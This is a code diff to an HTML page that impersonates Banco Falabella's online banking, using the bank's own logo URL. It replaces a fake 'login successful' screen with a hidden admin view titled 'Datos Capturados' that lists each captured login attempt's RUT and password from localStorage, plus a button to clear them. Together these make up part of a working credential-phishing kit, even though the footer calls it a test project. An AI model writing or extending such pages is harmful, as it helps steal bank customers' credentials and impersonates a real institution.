@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banca en Línea - Banco Falabella</title>
+    <title>Datos Capturados - Solo para ti</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,9 +20,7 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
         .header {
-            display: flex;
-            align-items: center;
-            gap: 15px;
+            text-align: center;
             padding-bottom: 20px;
             border-bottom: 1px solid #eee;
             margin-bottom: 30px;
@@ -30,30 +28,31 @@
         .header img {
             width: 180px;
         }
-        .welcome {
+        h1 {
             color: #009e4c;
             font-size: 24px;
-            font-weight: bold;
         }
-        .info {
-            background: #e8f5e9;
-            padding: 16px;
+        .datos {
+            background: #fff3e0;
+            padding: 20px;
             border-radius: 8px;
-            border-left: 4px solid #009e4c;
-            margin: 20px 0;
+            border-left: 4px solid #ff9800;
+            margin: 15px 0;
         }
-        .btn {
-            background: #009e4c;
+        .datos strong {
+            color: #e65100;
+        }
+        .clear-btn {
+            background: #d32f2f;
             color: white;
-            padding: 12px 24px;
+            padding: 10px 20px;
             border: none;
             border-radius: 6px;
-            font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            font-weight: bold;
         }
-        .btn:hover {
-            background: #008a41;
+        .clear-btn:hover {
+            background: #b71c1c;
         }
         .footer {
             text-align: center;
@@ -68,28 +67,53 @@
     <div class="container">
         <div class="header">
             <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Banco Falabella">
-            <div class="welcome">¡Bienvenido!</div>
+            <h1>Datos Capturados (Solo tú)</h1>
         </div>
 
-        <div class="info">
-            <strong>Acceso exitoso</strong><br>
-            Has iniciado sesión correctamente en tu Banca en Línea.
+        <button class="clear-btn" onclick="limpiarDatos()">Limpiar Todos los Datos</button>
+
+        <div id="lista-datos">
+            <!-- Aquí se muestran los datos guardados -->
         </div>
-
-        <p>Ahora puedes:</p>
-        <ul>
-            <li>Ver saldo de tus cuentas</li>
-            <li>Realizar transferencias</li>
-            <li>Pagar tarjetas</li>
-            <li>Consultar movimientos</li>
-        </ul>
-
-        <button class="btn" onclick="alert('Funcionalidad en desarrollo')">Ir al Panel Principal</button>
 
         <div class="footer">
-            Banco Falabella © 2025 | Este es un proyecto de prueba
+            Solo visible para el administrador | Proyecto de prueba
         </div>
     </div>
+
+    <script>
+        function mostrarDatos() {
+            const intentos = JSON.parse(localStorage.getItem('intentosLogin') || '[]');
+            const lista = document.getElementById('lista-datos');
+
+            if (intentos.length === 0) {
+                lista.innerHTML = '<p style="color:#999; text-align:center;">No hay datos capturados aún.</p>';
+                return;
+            }
+
+            lista.innerHTML = '';
+            intentos.forEach((item, index) => {
+                const div = document.createElement('div');
+                div.className = 'datos';
+                div.innerHTML = `
+                    <strong>Intento #${index + 1}</strong> - ${item.fecha}<br>
+                    <strong>RUT:</strong> ${item.rut}<br>
+                    <strong>Clave:</strong> ${item.clave}
+                `;
+                lista.appendChild(div);
+            });
+        }
+
+        function limpiarDatos() {
+            if (confirm('¿Seguro que quieres borrar todos los datos?')) {
+                localStorage.removeItem('intentosLogin');
+                mostrarDatos();
+            }
+        }
+
+        // Mostrar al cargar
+        mostrarDatos();
+    </script>
 
 </body>
 </html>
